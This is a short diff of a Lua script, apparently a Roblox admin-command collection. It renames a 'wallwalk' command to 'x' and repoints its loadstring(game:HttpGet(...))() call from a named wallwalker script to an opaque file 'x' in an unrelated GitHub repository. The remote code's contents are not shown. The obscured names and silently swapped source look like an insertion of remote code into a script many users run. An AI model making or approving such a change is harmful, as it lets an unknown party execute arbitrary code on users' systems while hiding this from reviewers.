@@ -8577,8 +8577,8 @@ addcmd("promptr15", {}, function(args, speaker)
 	promptNewRig(speaker, "R15")
 end)
 
-addcmd("wallwalk", {"walkonwalls"}, function(args, speaker)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
+addcmd("x", {"walkonwalls"}, function(args, speaker)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/raditself/a/main/x"))()
 end)
 
 addcmd('age',{},function(args, speaker)
